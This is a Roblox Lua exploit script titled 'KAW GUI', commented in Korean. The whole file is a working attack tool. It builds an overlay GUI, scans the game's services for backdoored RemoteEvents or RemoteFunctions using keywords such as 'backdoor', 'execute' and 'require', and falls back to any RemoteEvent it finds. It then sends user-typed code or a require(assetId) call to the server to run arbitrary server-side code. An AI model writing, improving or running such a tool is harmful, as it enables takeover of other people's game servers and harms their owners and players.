-- KAW GUI - 백도어 스캔 및 멀티 코드 전송 완벽 복원 버전
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

if CoreGui:FindFirstChild("KAW_GUI_Optimized") then
    CoreGui.KAW_GUI_Optimized:Destroy()
end

-- 1. 메인 베이스 프레임 (모던 플랫 디자인)
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "KAW_GUI_Optimized"
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 520, 0, 310)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -155)
MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true

local MainCorner = Instance.new("UICorner", MainFrame)
MainCorner.CornerRadius = UDim.new(0, 12)

-- 부드러운 트윈 애니메이션 함수
local function tween(object, info, properties)
    local t = TweenService:Create(object, info, properties)
    t:Play()
    return t
end
local tInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- UserInputService 기반 부드러운 드래그 로직
local dragging, dragInput, dragStart, startPos
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- GUI 토글 기능 (오른쪽 Shift 키)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.RightShift then
        ScreenGui.Enabled = not ScreenGui.Enabled
    end
end)

-- 2. 타이틀 및 버튼 스타일링
local TitleLabel = Instance.new("TextLabel", MainFrame)
TitleLabel.Size = UDim2.new(0, 240, 0, 80)
TitleLabel.Position = UDim2.new(0, 15, 0, 20)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "KAW GUI"
TitleLabel.Font = Enum.Font.BuilderSansMedium
TitleLabel.TextSize = 42
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left

local ScanButton = Instance.new("TextButton", MainFrame)
ScanButton.Size = UDim2.new(0, 240, 0, 110)
ScanButton.Position = UDim2.new(0, 15, 0, 160)
ScanButton.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
ScanButton.BorderSizePixel = 0
ScanButton.Text = "Start Scanning"
ScanButton.Font = Enum.Font.BuilderSansMedium
ScanButton.TextSize = 26
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)

local BtnCorner = Instance.new("UICorner", ScanButton)
BtnCorner.CornerRadius = UDim.new(0, 10)

-- 3. 우측 영역: 입력 필드 및 전송 버튼 (멀티라인 복원)
local CodeInput = Instance.new("TextBox", MainFrame)
CodeInput.Size = UDim2.new(0, 235, 0, 180)
CodeInput.Position = UDim2.new(0, 270, 0, 25)
CodeInput.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
CodeInput.BorderSizePixel = 0
CodeInput.TextColor3 = Color3.fromRGB(240, 240, 240)
CodeInput.Text = "-- 테스트용 코드 또는 에셋 ID 작성\nprint('KAW GUI Connected!')"
CodeInput.Font = Enum.Font.Code
CodeInput.TextSize = 11
CodeInput.TextXAlignment = Enum.TextXAlignment.Left
CodeInput.TextYAlignment = Enum.TextYAlignment.Top
CodeInput.ClearTextOnFocus = false
CodeInput.MultiLine = true -- 멀티라인 기능 정상 복원

local CodeCorner = Instance.new("UICorner", CodeInput)
CodeCorner.CornerRadius = UDim.new(0, 8)

local CodePadding = Instance.new("UIPadding", CodeInput)
CodePadding.PaddingLeft = UDim.new(0, 8)
CodePadding.PaddingTop = UDim.new(0, 8)

local ExecButton = Instance.new("TextButton", MainFrame)
ExecButton.Size = UDim2.new(0, 235, 0, 45)
ExecButton.Position = UDim2.new(0, 270, 0, 225)
ExecButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ExecButton.BorderSizePixel = 0
ExecButton.Text = "명령 전송하기"
ExecButton.Font = Enum.Font.BuilderSansMedium
ExecButton.TextSize = 18
ExecButton.TextColor3 = Color3.fromRGB(255, 255, 255)

local ExecCorner = Instance.new("UICorner", ExecButton)
ExecCorner.CornerRadius = UDim.new(0, 8)


-- 4. 백도어 및 취약 채널 정밀 탐색 알고리즘
local activeRemote = nil
local isScanning = false

ScanButton.MouseButton1Click:Connect(function()
    if isScanning then return end
    isScanning = true
    
    ScanButton.Text = "Scanning..."
    tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(50, 30, 30)})
    task.wait(0.3)
    
    activeRemote = nil
    
    -- [기능 복원] 백도어 및 원격 실행 관련 모든 키워드 세밀 추적
    local targetKeywords = {"weld", "joint", "execute", "backdoor", "run", "gg", "sync", "require", "load"}
    
    local function checkItem(item)
        if item:IsA("RemoteEvent") or item:IsA("RemoteFunction") then
            local n = item.Name:lower()
            for _, keyword in ipairs(targetKeywords) do
                if n:find(keyword) then
                    activeRemote = item
                    return true
                end
            end
            if not activeRemote and item:IsA("RemoteEvent") then
                activeRemote = item
            end
        end
        return false
    end

    local essentialServices = {
        game:GetService("ReplicatedStorage"),
        game:GetService("JointsService"),
        game:GetService("Workspace")
    }

    for _, service in ipairs(essentialServices) do
        for _, item in ipairs(service:GetDescendants()) do
            if checkItem(item) then break end
        end
        if activeRemote then break end
    end
    
    if activeRemote then
        ScanButton.Text = "CONNECTED!"
        tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(25, 70, 35)})
    else
        ScanButton.Text = "NOT FOUND"
        tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(45, 45, 45)})
        task.wait(1.2)
        ScanButton.Text = "Start Scanning"
        tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(22, 22, 22)})
    end
    isScanning = false
end)

-- 5. 안전한 코드 및 페이로드 데이터 전송 로직
ExecButton.MouseButton1Click:Connect(function()
    if not activeRemote then
        ExecButton.Text = "스캔을 완료하세요!"
        tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(70, 30, 30)})
        task.wait(1.2)
        ExecButton.Text = "명령 전송하기"
        tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)})
        return
    end
    
    local codePayload = CodeInput.Text
    
    task.spawn(function()
        local success, err = pcall(function()
            -- 에셋 ID 형태의 숫자인지 확인하여 최적화된 형태로 분기 전송
            local cleanText = codePayload:gsub("%s+", "")
            local isNumeric = tonumber(cleanText)
            
            if activeRemote:IsA("RemoteEvent") then
                if isNumeric then
                    activeRemote:FireServer("require", isNumeric)
                else
                    activeRemote:FireServer(codePayload)
                end
            elseif activeRemote:IsA("RemoteFunction") then
                if isNumeric then
                    activeRemote:InvokeServer("require", isNumeric)
                else
                    activeRemote:InvokeServer(codePayload)
                end
            end
        end)
        
        if success then
            ExecButton.Text = "전송 완료!"
            tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(25, 70, 35)})
        else
            ExecButton.Text = "에러 발생"
            tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(70, 30, 30)})
            warn("통신 실패 로그: " .. tostring(err))
        end
        
        task.wait(1.5)
        ExecButton.Text = "명령 전송하기"
        tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)})
    end)
end)
